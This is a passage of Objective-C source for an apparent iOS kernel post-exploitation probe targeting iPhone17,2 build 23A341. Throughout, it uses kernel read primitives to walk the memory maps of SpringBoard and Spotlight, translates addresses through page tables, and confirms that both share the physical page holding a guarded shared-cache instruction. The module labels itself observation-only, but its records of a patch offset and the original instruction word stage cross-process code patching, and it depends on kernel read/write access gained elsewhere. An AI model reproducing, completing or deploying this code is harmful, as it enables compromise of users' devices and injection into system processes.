        ![report[@"productBuildVersion"] isEqual:@CND_HAIL_MARY_BUILD] ||
        ![physicalProof isKindOfClass:NSDictionary.class] ||
        ![physicalProof[@"confirmed"] boolValue] ||
        ![physicalProof[@"physicalFrameResolved"] boolValue] ||
        ![physicalProof[@"samePhysicalFrame"] boolValue] ||
        ![physicalProof[@"samePhysicalAddress"] boolValue] ||
        runtimeVirtualAddress == 0 ||
        (runtimeVirtualAddress & ~(UINT64_C(0x7fffffffff))) != 0) {
        if (errorOut) *errorOut = @"confirmed-shared-physical-proof-required";
        return NO;
    }

    /* Revalidate the exact kernel identity, layout offsets, and live
     * physical-map anchors on a copy; the proof report stays immutable. */
    NSMutableDictionary<NSString *, id> *live =
        [report mutableCopy];
    if (!CNDHailMaryOffsetsMatch(live)) {
        if (errorOut) *errorOut = @"kernel-offset-layout-mismatch";
        return NO;
    }
    if (!CNDHailMaryValidateKernelIdentity(live, errorOut)) {
        return NO;
    }
    CNDHailMaryPhysicalMap physicalMap = {0};
    if (!CNDHailMaryLoadPhysicalMap(&physicalMap, live, errorOut)) {
        return NO;
    }

    static const char *const kProcessNames[2] = {"SpringBoard", "Spotlight"};
    NSDictionary<NSString *, id> *processes[2] = {
        report[@"springBoard"],
        report[@"spotlight"],
    };
    for (NSUInteger index = 0; index < 2; index++) {
        NSDictionary<NSString *, id> *process = processes[index];
        uint64_t expectedProc = 0;
        uint64_t expectedTask = 0;
        uint64_t expectedMap = 0;
        pid_t expectedPID = (pid_t)[process[@"pid"] intValue];
        if (![process isKindOfClass:NSDictionary.class] ||
            expectedPID <= 1 ||
            !CNDHailMaryParseHex(process[@"proc"], &expectedProc) ||
            !CNDHailMaryParseHex(process[@"task"], &expectedTask) ||
            !CNDHailMaryParseHex(process[@"map"], &expectedMap) ||
            !CNDHailMaryKernelPointer(expectedProc) ||
            !CNDHailMaryKernelPointer(expectedTask) ||
            !CNDHailMaryKernelPointer(expectedMap)) {
            if (errorOut) {
                *errorOut = [NSString stringWithFormat:
                    @"%@-process-identity-invalid", kProcessNames[index]];
            }
            return NO;
        }

        uint64_t liveProc = proc_find(expectedPID);
        uint64_t liveTask = is_kaddr_valid(liveProc)
            ? proc_task(liveProc) : 0;
        uint64_t liveMap = is_kaddr_valid(liveTask)
            ? task_get_vm_map(liveTask) : 0;
        if (liveProc != expectedProc || liveTask != expectedTask ||
            liveMap != expectedMap ||
            strcmp(proc_get_p_name(liveProc) ?: "",
                   kProcessNames[index]) != 0) {
            if (errorOut) {
                *errorOut = [NSString stringWithFormat:
                    @"%@-changed-after-physical-proof", kProcessNames[index]];
            }
            return NO;
        }
    }

    NSDictionary<NSString *, id> *springBoardTranslation =
        CNDHailMaryTranslateVirtualAddress(
            processes[0], runtimeVirtualAddress, &physicalMap, errorOut);
    if (!springBoardTranslation) return NO;
    NSDictionary<NSString *, id> *spotlightTranslation =
        CNDHailMaryTranslateVirtualAddress(
            processes[1], runtimeVirtualAddress, &physicalMap, errorOut);
    if (!spotlightTranslation) return NO;

    uint64_t springBoardPhysical = 0;
    uint64_t spotlightPhysical = 0;
    uint64_t springBoardFrame = 0;
    uint64_t spotlightFrame = 0;
    unsigned springBoardTerminalLevel =
        [springBoardTranslation[@"terminalLevel"] unsignedIntValue];
    unsigned spotlightTerminalLevel =
        [spotlightTranslation[@"terminalLevel"] unsignedIntValue];
    if (springBoardTerminalLevel != 3 || spotlightTerminalLevel != 3 ||
        !CNDHailMaryParseHex(
            springBoardTranslation[@"physicalAddress"],
            &springBoardPhysical) ||
        !CNDHailMaryParseHex(
            spotlightTranslation[@"physicalAddress"],
            &spotlightPhysical) ||
        !CNDHailMaryParseHex(
            springBoardTranslation[@"physicalFrame"],
            &springBoardFrame) ||
        !CNDHailMaryParseHex(
            spotlightTranslation[@"physicalFrame"],
            &spotlightFrame) ||
        springBoardFrame == 0 ||
        springBoardFrame != spotlightFrame ||
        springBoardPhysical != spotlightPhysical ||
        springBoardPhysical < springBoardFrame ||
        springBoardPhysical - springBoardFrame >= kCNDHailMaryPageSize) {
        if (errorOut) *errorOut = @"shared-terminal-frame-translation-failed";
        return NO;
    }

    uint64_t frameKernelVirtualAddress = 0;
    if (!CNDHailMaryPhysicalToKernelVirtual(
            &physicalMap, springBoardFrame, &frameKernelVirtualAddress)) {
        if (errorOut) *errorOut = @"shared-frame-outside-physical-aperture";
        return NO;
    }

    if (springBoardTranslationOut) {
        *springBoardTranslationOut = springBoardTranslation;
    }
    if (spotlightTranslationOut) {
        *spotlightTranslationOut = spotlightTranslation;
    }
    if (physicalFrameOut) *physicalFrameOut = springBoardFrame;
    if (physicalAddressOut) *physicalAddressOut = springBoardPhysical;
    if (frameKernelVirtualAddressOut) {
        *frameKernelVirtualAddressOut = frameKernelVirtualAddress;
    }
    return YES;
}

static BOOL CNDHailMaryAddSigned(uint64_t address, int64_t delta,
                                 uint64_t *resultOut)
{
    __int128 result = (__int128)address + (__int128)delta;
    if (result < 0 || result > UINT64_MAX) return NO;
    if (resultOut) *resultOut = (uint64_t)result;
    return YES;
}

static BOOL CNDHailMaryChildDelta(int64_t parentDelta,
                                  uint64_t parentStart,
                                  uint64_t childStart,
                                  int64_t *resultOut)
{
    __int128 result = (__int128)parentDelta + (__int128)parentStart -
        (__int128)childStart;
    if (result < INT64_MIN || result > INT64_MAX) return NO;
    if (resultOut) *resultOut = (int64_t)result;
    return YES;
}

static NSDictionary<NSString *, id> *CNDHailMaryPathNode(
    NSString *kind, uint64_t map, uint64_t entry, uint64_t start,
    uint64_t end, uint64_t offset, uint64_t backing)
{
    return @{
        @"kind": kind,
        @"map": CNDHailMaryHex(map),
        @"entry": CNDHailMaryHex(entry),
        @"start": CNDHailMaryHex(start),
        @"end": CNDHailMaryHex(end),
        @"offset": CNDHailMaryHex(offset),
        @"backing": CNDHailMaryHex(backing),
    };
}

static void CNDHailMaryConsiderSlideAnchor(
    NSMutableDictionary<NSString *, NSNumber *> *stats,
    NSArray<NSDictionary<NSString *, id> *> *path,
    uint64_t mappingStart,
    uint64_t mappingOffset,
    uint64_t flags,
    int64_t rootDelta)
{
    NSDictionary<NSString *, id> *rootNode = path.firstObject;
    uint32_t protection = (uint32_t)((flags >> 7) & 0x7);
    BOOL sharedRegionRoot =
        [rootNode[@"kind"] isEqual:@"submap"] &&
        [rootNode[@"start"] isEqual:
            CNDHailMaryHex(kCNDHailMarySharedRegionBase)] &&
        [rootNode[@"offset"] isEqual:CNDHailMaryHex(0)];
    if (!sharedRegionRoot || (protection & 0x4U) == 0 || mappingOffset != 0) {
        return;
    }

    uint64_t runtimeMappingStart = 0;
    if (!CNDHailMaryAddSigned(mappingStart, rootDelta,
                              &runtimeMappingStart) ||
        runtimeMappingStart < kCNDHailMarySharedRegionBase) {
        return;
    }
    uint64_t anchorSlide =
        runtimeMappingStart - kCNDHailMarySharedRegionBase;
    if (anchorSlide > UINT64_C(0x40000000) ||
        (anchorSlide & (kCNDHailMaryPageSize - 1)) != 0) {
        return;
    }

    NSNumber *prior = stats[@"sharedCacheSlideAnchor"];
    if (!prior || anchorSlide < prior.unsignedLongLongValue) {
        stats[@"sharedCacheSlideAnchor"] = @(anchorSlide);
    }
}

static BOOL CNDHailMaryCollectCandidates(
    NSString *processName,
    uint64_t map,
    int64_t rootDelta,
    uint64_t allowedStart,
    uint64_t allowedEnd,
    NSUInteger depth,
    NSMutableSet<NSNumber *> *activeMaps,
    NSMutableArray<NSDictionary<NSString *, id> *> *path,
    NSMutableArray<NSDictionary<NSString *, id> *> *candidates,
    NSMutableDictionary<NSString *, NSNumber *> *stats,
    NSString **errorOut)
{
    static const NSUInteger kMaximumDepth = 8;
    static const uint32_t kMaximumEntriesPerMap = 65536;
    static const unsigned long long kMaximumEntriesTotal = 250000;

    if (depth > kMaximumDepth || !CNDHailMaryKernelPointer(map) ||
        allowedStart >= allowedEnd) {
        if (errorOut) *errorOut = @"invalid-map-or-depth";
        return NO;
    }

    NSNumber *mapKey = @(map);
    if ([activeMaps containsObject:mapKey]) {
        if (errorOut) *errorOut = @"submap-cycle";
        return NO;
    }
    [activeMaps addObject:mapKey];

    uint64_t header = map + off_vm_map_hdr;
    uint32_t entryCount = kread32(header + off_vm_map_header_nentries);
    uint64_t entry = kread_ptr(header + off_vm_map_header_links_next);
    uint64_t firstEntry = entry;
    if (entryCount > kMaximumEntriesPerMap ||
        (entryCount != 0 && !CNDHailMaryKernelPointer(entry))) {
        [activeMaps removeObject:mapKey];
        if (errorOut) *errorOut = @"invalid-map-header";
        return NO;
    }

    stats[@"mapsRead"] = @([stats[@"mapsRead"] unsignedLongLongValue] + 1);
    stats[@"maximumDepth"] = @(MAX([stats[@"maximumDepth"] unsignedIntegerValue], depth));

    for (uint32_t index = 0; index < entryCount; index++) {
        unsigned long long total = [stats[@"entriesRead"] unsignedLongLongValue];
        if (total >= kMaximumEntriesTotal ||
            !CNDHailMaryKernelPointer(entry) || entry == header) {
            [activeMaps removeObject:mapKey];
            if (errorOut) *errorOut = @"invalid-or-unstable-entry-list";
            return NO;
        }

        uint64_t next = kread_ptr(entry + off_vm_map_entry_links_next);
        uint64_t start = kread64(entry + 0x10);
        uint64_t end = kread64(entry + 0x18);
        uint64_t objectWord = kread64(entry + 0x38);
        uint64_t aliasAndOffset = kread64(entry + off_vm_map_entry_vme_alias);
        uint64_t flags = kread64(entry + 0x48);
        uint64_t mappingOffset = aliasAndOffset & ~UINT64_C(0xfff);
        BOOL isSubmap = (objectWord & UINT64_C(2)) != 0;

        stats[@"entriesRead"] = @(total + 1);
        if (start >= end || end >= UINT64_C(0x8000000000000000)) {
            [activeMaps removeObject:mapKey];
            if (errorOut) *errorOut = @"invalid-entry-range";
            return NO;
        }
        if (index + 1 < entryCount &&
            !CNDHailMaryKernelPointer(next)) {
            [activeMaps removeObject:mapKey];
            if (errorOut) *errorOut = @"invalid-next-entry";
            return NO;
        }

        uint64_t length = end - start;
        uint64_t overlapStart = MAX(start, allowedStart);
        uint64_t overlapEnd = MIN(end, allowedEnd);
        if (overlapStart >= overlapEnd) {
            entry = next;
            continue;
        }
        if (isSubmap) {
            uint64_t submap = objectWord & ~UINT64_C(3);
            int64_t childDelta = 0;
            uint64_t childStart = 0;
            uint64_t childEnd = 0;
            BOOL childRangeValid =
                mappingOffset <= UINT64_MAX - (overlapStart - start) &&
                mappingOffset <= UINT64_MAX - (overlapEnd - start);
            if (childRangeValid) {
                childStart = mappingOffset + (overlapStart - start);
                childEnd = mappingOffset + (overlapEnd - start);
            }
            if (!CNDHailMaryKernelPointer(submap) ||
                !childRangeValid || childStart >= childEnd ||
                !CNDHailMaryChildDelta(rootDelta, start, mappingOffset,
                                       &childDelta)) {
                [activeMaps removeObject:mapKey];
                if (errorOut) *errorOut = @"invalid-submap-entry";
                return NO;
            }

            stats[@"submapsRead"] = @([stats[@"submapsRead"] unsignedLongLongValue] + 1);
            [path addObject:CNDHailMaryPathNode(
                @"submap", map, entry, start, end, mappingOffset, submap)];
            BOOL descended = CNDHailMaryCollectCandidates(
                processName, submap, childDelta, childStart, childEnd,
                depth + 1, activeMaps, path, candidates, stats, errorOut);
            [path removeLastObject];
            if (!descended) {
                [activeMaps removeObject:mapKey];
                return NO;
            }
        } else {
            CNDHailMaryConsiderSlideAnchor(
                stats, path, start, mappingOffset, flags, rootDelta);
            if (!(kCNDHailMarySubcacheFileOffset >= mappingOffset &&
                  kCNDHailMarySubcacheFileOffset - mappingOffset < length)) {
                entry = next;
                continue;
            }
            uint32_t packedObject = (uint32_t)(objectWord >> 32);
            uint64_t object = CNDHailMaryUnpackObject(packedObject);
            uint64_t localAddress = start +
                (kCNDHailMarySubcacheFileOffset - mappingOffset);
            uint64_t runtimeAddress = 0;
            uint64_t objectSize = object
                ? kread64(object + off_vm_object_vo_un1_vou_size) : 0;
            uint64_t slide = 0;
            BOOL translated = CNDHailMaryAddSigned(
                localAddress, rootDelta, &runtimeAddress);
            BOOL slideValid = translated &&
                runtimeAddress >= kCNDHailMaryUnslidPatchAddress &&
                (runtimeAddress - kCNDHailMaryUnslidPatchAddress) <=
                    UINT64_C(0x40000000) &&
                ((runtimeAddress - kCNDHailMaryUnslidPatchAddress) &
                    (kCNDHailMaryPageSize - 1)) == 0;
            if (slideValid) {
                slide = runtimeAddress - kCNDHailMaryUnslidPatchAddress;
            }

            uint32_t protection = (uint32_t)((flags >> 7) & 0x7);
            BOOL shared = (flags & UINT64_C(1)) != 0;
            BOOL inTransition = (flags & UINT64_C(4)) != 0;
            BOOL needsCopy = (flags & UINT64_C(0x40)) != 0;
            BOOL executable = (protection & 0x4U) != 0;
            BOOL objectRangeValid = object != 0 &&
                objectSize >= kCNDHailMarySubcacheFileOffset + sizeof(uint32_t);

            BOOL insideMappedSubmapSlice =
                localAddress >= overlapStart && localAddress < overlapEnd;
            if (slideValid && executable && objectRangeValid && !inTransition &&
                insideMappedSubmapSlice) {
                NSMutableArray<NSDictionary<NSString *, id> *> *candidatePath =
                    [path mutableCopy];
                [candidatePath addObject:CNDHailMaryPathNode(
                    @"object", map, entry, start, end, mappingOffset, object)];
                [candidates addObject:@{
                    @"process": processName,
                    @"runtimeAddress": CNDHailMaryHex(runtimeAddress),
                    @"slide": CNDHailMaryHex(slide),
                    @"object": CNDHailMaryHex(object),
                    @"objectSize": CNDHailMaryHex(objectSize),
                    @"objectOffset": CNDHailMaryHex(kCNDHailMarySubcacheFileOffset),
                    @"objectPageOffset": CNDHailMaryHex(
                        kCNDHailMarySubcacheFileOffset &
                        ~(kCNDHailMaryPageSize - 1)),
                    @"offsetWithinPage": @(
                        kCNDHailMarySubcacheFileOffset &
                        (kCNDHailMaryPageSize - 1)),
                    @"leafMap": CNDHailMaryHex(map),
                    @"leafEntry": CNDHailMaryHex(entry),
                    @"leafMappingOffset": CNDHailMaryHex(mappingOffset),
                    @"protection": @(protection),
                    @"isShared": @(shared),
                    @"needsCopy": @(needsCopy),
                    @"path": candidatePath,
                }];
            }
        }

        entry = next;
    }

    uint32_t finalEntryCount =
        kread32(header + off_vm_map_header_nentries);
    uint64_t finalFirstEntry =
        kread_ptr(header + off_vm_map_header_links_next);
    if (entry != header || finalEntryCount != entryCount ||
        finalFirstEntry != firstEntry) {
        [activeMaps removeObject:mapKey];
        if (errorOut) {
            *errorOut = [NSString stringWithFormat:
                @"map-changed-during-observation map=%@ first=%@/%@ count=%u/%u tail=%@ header=%@",
                CNDHailMaryHex(map), CNDHailMaryHex(firstEntry),
                CNDHailMaryHex(finalFirstEntry), entryCount, finalEntryCount,
                CNDHailMaryHex(entry), CNDHailMaryHex(header)];
        }
        return NO;
    }

    [activeMaps removeObject:mapKey];
    return YES;
}

static NSDictionary<NSString *, id> *CNDHailMaryInspectProcess(
    const char *name, NSString **errorOut)
{
    uint64_t proc = proc_find_by_name(name);
    if (!CNDHailMaryKernelPointer(proc)) {
        if (errorOut) *errorOut = [NSString stringWithFormat:
            @"%s-not-running", name];
        return nil;
    }

    char capturedName[33] = {0};
    kreadbuf(proc + off_proc_p_name, capturedName, 32);
    NSString *kernelName = [NSString stringWithUTF8String:capturedName] ?: @"";
    NSString *expectedName = [NSString stringWithUTF8String:name] ?: @"";
    if (![kernelName isEqualToString:expectedName]) {
        if (errorOut) *errorOut = @"process-identity-mismatch";
        return nil;
    }

    uint32_t pid = kread32(proc + off_proc_p_pid);
    uint64_t task = proc_task(proc);
    uint64_t map = task_get_vm_map(task);
    if (pid == 0 || !CNDHailMaryKernelPointer(task) ||
        !CNDHailMaryKernelPointer(map)) {
        if (errorOut) *errorOut = @"invalid-process-task-map";
        return nil;
    }

    NSMutableArray<NSDictionary<NSString *, id> *> *candidates = nil;
    NSMutableDictionary<NSString *, NSNumber *> *stats = nil;
    NSString *walkError = nil;
    BOOL walked = NO;
    NSUInteger observationAttempt = 0;
    static const NSUInteger kMaximumObservationAttempts = 8;
    for (observationAttempt = 1;
         observationAttempt <= kMaximumObservationAttempts;
         observationAttempt++) {
        candidates = [NSMutableArray array];
        stats = [@{
            @"mapsRead": @0,
            @"entriesRead": @0,
            @"submapsRead": @0,
            @"maximumDepth": @0,
        } mutableCopy];
        NSMutableSet<NSNumber *> *activeMaps = [NSMutableSet set];
        NSMutableArray<NSDictionary<NSString *, id> *> *path =
            [NSMutableArray array];
        walkError = nil;
        walked = CNDHailMaryCollectCandidates(
            expectedName, map, 0, 0, UINT64_MAX, 0, activeMaps, path,
            candidates, stats, &walkError);
        if (walked ||
            ![walkError hasPrefix:@"map-changed-during-observation"]) {
            break;
        }
    }
    if (!walked) {
        if (errorOut) *errorOut = walkError ?: @"map-walk-failed";
        return nil;
    }

    stats[@"observationAttempts"] = @(observationAttempt);
    NSNumber *slideAnchor = stats[@"sharedCacheSlideAnchor"];
    if (!slideAnchor) {
        if (errorOut) *errorOut = @"shared-cache-slide-anchor-unresolved";
        return nil;
    }
    NSString *slideHex = CNDHailMaryHex(slideAnchor.unsignedLongLongValue);
    NSUInteger allCandidateCount = candidates.count;
    NSIndexSet *nonmatching = [candidates indexesOfObjectsPassingTest:
        ^BOOL(NSDictionary<NSString *, id> *candidate, NSUInteger index,
              BOOL *stop) {
        return ![candidate[@"slide"] isEqual:slideHex];
    }];
    [candidates removeObjectsAtIndexes:nonmatching];
    stats[@"allSubcacheOffsetCandidateCount"] = @(allCandidateCount);
    stats[@"slideMatchedCandidateCount"] = @(candidates.count);

    return @{
        @"name": kernelName,
        @"pid": @(pid),
        @"proc": CNDHailMaryHex(proc),
        @"task": CNDHailMaryHex(task),
        @"map": CNDHailMaryHex(map),
        @"sharedCacheSlide": slideHex,
        @"stats": stats,
        @"candidates": candidates,
    };
}

static NSString *CNDHailMaryFirstSubmap(
    NSDictionary<NSString *, id> *candidate)
{
    for (NSDictionary<NSString *, id> *node in candidate[@"path"]) {
        if ([node[@"kind"] isEqual:@"submap"]) return node[@"backing"];
    }
    return @"";
}

static NSDictionary<NSString *, id> *CNDHailMaryCompare(
    NSArray<NSDictionary<NSString *, id> *> *springBoardCandidates,
    NSArray<NSDictionary<NSString *, id> *> *spotlightCandidates)
{
    NSMutableArray<NSDictionary<NSString *, id> *> *matches =
        [NSMutableArray array];
    for (NSDictionary<NSString *, id> *springBoard in springBoardCandidates) {
        for (NSDictionary<NSString *, id> *spotlight in spotlightCandidates) {
            BOOL sameObject = [springBoard[@"object"]
                isEqual:spotlight[@"object"]];
            BOOL sameOffset = [springBoard[@"objectOffset"]
                isEqual:spotlight[@"objectOffset"]];
            BOOL sameRuntimeAddress = [springBoard[@"runtimeAddress"]
                isEqual:spotlight[@"runtimeAddress"]];
            BOOL safeSharingFlags =
                ![springBoard[@"needsCopy"] boolValue] &&
                ![spotlight[@"needsCopy"] boolValue];
            if (sameObject && sameOffset && sameRuntimeAddress &&
                safeSharingFlags) {
                [matches addObject:@{
                    @"springBoard": springBoard,
                    @"spotlight": spotlight,
                }];
            }
        }
    }

    if (matches.count != 1) {
        return @{
            @"confirmed": @NO,
            @"matchingPairCount": @(matches.count),
            @"sameBackingObjectPageSlot": @NO,
            @"physicalFrameResolved": @NO,
            @"verdict": matches.count == 0
                ? @"different-or-unresolved-backing"
                : @"ambiguous-backing-candidates",
        };
    }

    NSDictionary<NSString *, id> *match = matches.firstObject;
    NSDictionary<NSString *, id> *springBoard = match[@"springBoard"];
    NSDictionary<NSString *, id> *spotlight = match[@"spotlight"];
    NSString *springBoardSubmap = CNDHailMaryFirstSubmap(springBoard);
    NSString *spotlightSubmap = CNDHailMaryFirstSubmap(spotlight);
    return @{
        @"confirmed": @YES,
        @"matchingPairCount": @1,
        @"sameRootSubmap": @(
            springBoardSubmap.length != 0 &&
            [springBoardSubmap isEqual:spotlightSubmap]),
        @"sameBackingObject": @YES,
        @"sameObjectOffset": @YES,
        @"sameBackingObjectPageSlot": @YES,
        @"bothEntriesMarkedShared": @(
            [springBoard[@"isShared"] boolValue] &&
            [spotlight[@"isShared"] boolValue]),
        @"physicalFrameResolved": @NO,
        @"physicalFrameStatus":
            @"not-resolved-no-validated-vm-page-layout",
        @"verdict": @"confirmed-shared-backing-page-slot",
        @"springBoard": springBoard,
        @"spotlight": spotlight,
    };
}

static NSDictionary<NSString *, id> *CNDHailMaryPhysicalFailure(
    NSString *verdict, NSString *message)
{
    return @{
        @"confirmed": @NO,
        @"physicalFrameResolved": @NO,
        @"samePhysicalFrame": @NO,
        @"runtimeInstructionBytesVerified": @NO,
        @"verdict": verdict ?: @"physical-page-proof-failed",
        @"message": message ?: @"Physical-page proof failed closed.",
    };
}

static NSDictionary<NSString *, id> *CNDHailMaryProvePhysicalPage(
    NSDictionary<NSString *, id> *springBoard,
    NSDictionary<NSString *, id> *spotlight,
    NSDictionary<NSString *, id> *objectComparison,
    const CNDHailMaryPhysicalMap *physicalMap)
{
    if (![objectComparison[@"confirmed"] boolValue]) {
        return CNDHailMaryPhysicalFailure(
            @"object-backing-prerequisite-failed",
            @"The shared backing object/page-slot prerequisite was not proven.");
    }
    NSDictionary<NSString *, id> *springBoardCandidate =
        objectComparison[@"springBoard"];
    NSDictionary<NSString *, id> *spotlightCandidate =
        objectComparison[@"spotlight"];
    uint64_t springBoardAddress = 0;
    uint64_t spotlightAddress = 0;
    if (!CNDHailMaryParseHex(springBoardCandidate[@"runtimeAddress"],
                             &springBoardAddress) ||
        !CNDHailMaryParseHex(spotlightCandidate[@"runtimeAddress"],
                             &spotlightAddress) ||
        springBoardAddress != spotlightAddress) {
        return CNDHailMaryPhysicalFailure(
            @"runtime-address-prerequisite-mismatch",
            @"The two object candidates did not preserve one exact runtime address.");
    }

    NSString *springBoardError = nil;
    NSDictionary<NSString *, id> *springBoardTranslation =
        CNDHailMaryTranslateVirtualAddress(
            springBoard, springBoardAddress, physicalMap,
            &springBoardError);
    if (!springBoardTranslation) {
        return CNDHailMaryPhysicalFailure(
            @"springboard-pmap-translation-failed",
            springBoardError ?: @"SpringBoard page-table translation failed.");
    }
    NSString *spotlightError = nil;
    NSDictionary<NSString *, id> *spotlightTranslation =
        CNDHailMaryTranslateVirtualAddress(
            spotlight, spotlightAddress, physicalMap, &spotlightError);
    if (!spotlightTranslation) {
        return @{
            @"confirmed": @NO,
            @"physicalFrameResolved": @NO,
            @"samePhysicalFrame": @NO,
            @"runtimeInstructionBytesVerified": @NO,
            @"springBoard": springBoardTranslation,
            @"verdict": @"spotlight-pmap-translation-failed",
            @"message": spotlightError ?:
                @"Spotlight page-table translation failed.",
        };
    }

    uint64_t springBoardPhysical = 0;
    uint64_t spotlightPhysical = 0;
    uint64_t springBoardFrame = 0;
    uint64_t spotlightFrame = 0;
    BOOL parsedPhysical =
        CNDHailMaryParseHex(springBoardTranslation[@"physicalAddress"],
                            &springBoardPhysical) &&
        CNDHailMaryParseHex(spotlightTranslation[@"physicalAddress"],
                            &spotlightPhysical) &&
        CNDHailMaryParseHex(springBoardTranslation[@"physicalFrame"],
                            &springBoardFrame) &&
        CNDHailMaryParseHex(spotlightTranslation[@"physicalFrame"],
                            &spotlightFrame);
    BOOL sameFrame = parsedPhysical && springBoardFrame != 0 &&
        springBoardFrame == spotlightFrame &&
        springBoardPhysical == spotlightPhysical;
    if (!sameFrame) {
        return @{
            @"confirmed": @NO,
            @"physicalFrameResolved": @(parsedPhysical),
            @"samePhysicalFrame": @NO,
            @"runtimeInstructionBytesVerified": @NO,
            @"springBoard": springBoardTranslation,
            @"spotlight": spotlightTranslation,
            @"verdict": @"physical-frame-mismatch",
            @"message": @"The process page tables did not resolve the target to one physical address.",
        };
    }

    uint64_t expectedOffset = kCNDHailMarySubcacheFileOffset &
        (kCNDHailMaryPageSize - 1);
    uint64_t offsetWithinFrame = springBoardPhysical - springBoardFrame;
    uint64_t frameKVA = 0;
    if (offsetWithinFrame != expectedOffset ||
        offsetWithinFrame < kCNDHailMaryGuardPatchOffset ||
        offsetWithinFrame - kCNDHailMaryGuardPatchOffset >
            kCNDHailMaryPageSize - kCNDHailMaryGuardLength ||
        !CNDHailMaryPhysicalToKernelVirtual(
            physicalMap, springBoardFrame, &frameKVA)) {
        return @{
            @"confirmed": @NO,
            @"physicalFrameResolved": @YES,
            @"samePhysicalFrame": @YES,
            @"runtimeInstructionBytesVerified": @NO,
            @"springBoard": springBoardTranslation,
            @"spotlight": spotlightTranslation,
            @"verdict": @"physical-byte-window-invalid",
            @"message": @"The shared frame did not expose the exact guarded byte window at the derived offset.",
        };
    }

    uint64_t guardOffsetWithinFrame = offsetWithinFrame -
        kCNDHailMaryGuardPatchOffset;
    uint8_t guardBytes[kCNDHailMaryGuardLength];
    memset(guardBytes, 0, sizeof(guardBytes));
    kreadbuf(frameKVA + guardOffsetWithinFrame,
             guardBytes, sizeof(guardBytes));
    uint32_t instructionWord = 0;
    memcpy(&instructionWord,
           guardBytes + kCNDHailMaryGuardPatchOffset,
           sizeof(instructionWord));
    NSString *contextSHA256 = CNDHailMarySHA256(
        guardBytes, sizeof(guardBytes));
    BOOL wordMatches = instructionWord == kCNDHailMaryOriginalWord;
    BOOL hashMatches = [contextSHA256
        isEqual:@CND_HAIL_MARY_CONTEXT_SHA256];

    NSString *springBoardPostError = nil;
    NSString *spotlightPostError = nil;
    NSDictionary<NSString *, id> *springBoardPost =
        CNDHailMaryTranslateVirtualAddress(
            springBoard, springBoardAddress, physicalMap,
            &springBoardPostError);
    NSDictionary<NSString *, id> *spotlightPost =
        CNDHailMaryTranslateVirtualAddress(
            spotlight, spotlightAddress, physicalMap,
            &spotlightPostError);
    BOOL postReadStable = springBoardPost && spotlightPost &&
        [springBoardPost[@"physicalAddress"]
            isEqual:springBoardTranslation[@"physicalAddress"]] &&
        [spotlightPost[@"physicalAddress"]
            isEqual:spotlightTranslation[@"physicalAddress"]] &&
        [springBoardPost[@"terminalEntryValue"]
            isEqual:springBoardTranslation[@"terminalEntryValue"]] &&
        [spotlightPost[@"terminalEntryValue"]
            isEqual:spotlightTranslation[@"terminalEntryValue"]];
    BOOL confirmed = wordMatches && hashMatches && postReadStable;

    NSMutableDictionary<NSString *, id> *proof = [@{
        @"confirmed": @(confirmed),
        @"physicalFrameResolved": @YES,
        @"samePhysicalFrame": @YES,
        @"samePhysicalAddress": @YES,
        @"runtimeInstructionBytesVerified": @(wordMatches && hashMatches),
        @"postReadTranslationStable": @(postReadStable),
        @"physicalFrame": CNDHailMaryHex(springBoardFrame),
        @"physicalAddress": CNDHailMaryHex(springBoardPhysical),
        @"frameKernelVirtualAddress": CNDHailMaryHex(frameKVA),
        @"offsetWithinFrame": @(offsetWithinFrame),
        @"guard": @{
            @"subcacheFileOffset": CNDHailMaryHex(
                kCNDHailMaryGuardFileOffset),
            @"offsetWithinFrame": @(guardOffsetWithinFrame),
            @"byteLength": @(kCNDHailMaryGuardLength),
            @"bytesHex": CNDHailMaryBytesHex(
                guardBytes, sizeof(guardBytes)),
            @"sha256": contextSHA256,
            @"expectedSHA256": @CND_HAIL_MARY_CONTEXT_SHA256,
            @"sha256Matches": @(hashMatches),
            @"instructionWord": CNDHailMaryHex(instructionWord),
            @"expectedInstructionWord": CNDHailMaryHex(
                kCNDHailMaryOriginalWord),
            @"instructionWordMatches": @(wordMatches),
        },
        @"springBoard": springBoardTranslation,
        @"spotlight": spotlightTranslation,
        @"verdict": confirmed
            ? @"confirmed-shared-physical-frame-and-bytes"
            : (postReadStable
                ? @"runtime-byte-guard-mismatch"
                : @"translation-changed-after-byte-read"),
        @"message": confirmed
            ? @"SpringBoard and Spotlight resolve the guarded instruction to the same physical frame and exact original bytes."
            : (postReadStable
                ? @"The frame was shared, but the live original-word/context guard did not match exactly."
                : @"A page-table translation changed while the guarded bytes were observed."),
    } mutableCopy];
    if (!springBoardPost) {
        proof[@"springBoardPostReadError"] = springBoardPostError ?:
            @"post-read translation failed";
    }
    if (!spotlightPost) {
        proof[@"spotlightPostReadError"] = spotlightPostError ?:
            @"post-read translation failed";
    }
    return proof;
}

BOOL CNDHailMaryProbeIsSupported(NSString **reasonOut)
{
    NSString *product = CNDHailMarySysctlString("hw.machine");
    NSString *build = CNDHailMarySysctlString("kern.osversion");
    BOOL supported = [product isEqual:@CND_HAIL_MARY_PRODUCT] &&
        [build isEqual:@CND_HAIL_MARY_BUILD];
    if (reasonOut) {
        *reasonOut = supported
            ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 on 23A341; this device is %@ on %@.",
                product.length ? product : @"unknown hardware",
                build.length ? build : @"unknown build"];
    }
    return supported;
}

BOOL CNDHailMaryProbeIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDHailMaryProbeRunning, 0) != 0;
}

void CNDHailMaryProbeRun(CNDHailMaryProbeCompletion completion)
{
    if (!completion) return;
    if (!__sync_bool_compare_and_swap(&gCNDHailMaryProbeRunning, 0, 1)) {
        completion(@{
            @"result": @"refused-already-running",
            @"message": @"The Hail Mary Probe is already running.",
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            NSString *reportPath = CNDHailMaryReportPath();
            NSMutableDictionary<NSString *, id> *report = [@{
                @"schemaVersion": @2,
                @"probe": @"hail-mary-physical-page-proof",
                @"mode": @"observation-only",
                @"kernelMutationCount": @0,
                @"kernelMutationScope":
                    @"observation stage only; KRW acquisition is external and excluded",
                @"targetProcessMutationCount": @0,
                @"localReportWriteCount": @1,
                @"reportPath": reportPath,
                @"productType": CNDHailMarySysctlString("hw.machine"),
                @"productBuildVersion": CNDHailMarySysctlString("kern.osversion"),
                @"expected": @{
                    @"productType": @CND_HAIL_MARY_PRODUCT,
                    @"productBuildVersion": @CND_HAIL_MARY_BUILD,
                    @"cacheUUID": @CND_HAIL_MARY_CACHE_UUID,
